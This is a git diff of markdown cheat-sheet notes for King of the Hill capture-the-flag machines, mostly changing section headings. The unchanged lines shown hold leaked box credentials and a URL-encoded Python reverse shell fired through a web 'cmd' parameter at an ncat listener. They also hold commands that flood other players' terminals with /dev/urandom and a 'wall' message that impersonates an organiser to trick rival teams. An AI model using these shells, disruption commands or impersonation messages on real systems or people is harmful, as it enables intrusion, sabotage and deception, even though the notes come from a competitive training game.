@@ -14,8 +14,8 @@ run linPEAS.sh(tool that finds potential privilege escalation points)
 /etc/passwd - place that stores users  
 /root/king.txt - ideally it stays as Happygator  
 
-
-# food:  
+# machines:
+## food:  
 
 food:givemecookies (telnet or ssh)  
 ramen:noodlesRTheBest (ssh)  
@@ -34,7 +34,7 @@ done
 profit  
 
 
-# shrek:  
+## shrek:  
 navigate to <ip>/Cpxtpt2hWCee9VFa.txt  
 save the rsa key  
 ```
@@ -62,7 +62,7 @@ afterwards stuff
 
 
 
-# space jam:  
+## space jam:  
 ```
 ncat -lvnp 4444  
 curl "<BOX_IP>:3000/?cmd=python%20-  c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<YOUR_MACHINE_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"  
@@ -92,11 +92,14 @@ echo "banana" > /dev/pts/<0 through 9>
 cat /dev/urandom > /dev/pts/<everyone except you> &  
 use social engineering wall  
 
-# social engineering wall:
+## social engineering wall:
 put this in a message.txt file
 `This is Irvin. We accidentally used the wrong machine; so we're going to restart this KoTH with the correct machine in order to ensure all teams get a chance. I'll put the correct link once the new machine gets up and running.`
 then do:
 `sudo wall message.txt`
+
+## script to stay king:
+
 
 
 
